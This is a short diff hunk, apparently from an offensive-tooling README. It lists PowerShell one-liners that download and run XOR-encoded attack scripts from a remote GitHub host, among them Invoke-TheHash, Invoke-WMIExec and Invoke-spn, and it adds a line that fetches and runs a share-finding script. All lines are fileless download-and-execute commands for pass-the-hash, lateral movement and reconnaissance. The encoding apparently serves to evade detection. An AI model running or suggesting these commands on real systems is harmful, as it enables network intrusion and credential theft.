@@ -23,4 +23,6 @@ IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/Invoke-spn.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/Invoke-TheHash.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/Invoke-WMIExec.ps1-xorencoded.ps1')
+IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/sharefinder.ps1')
+
 ```
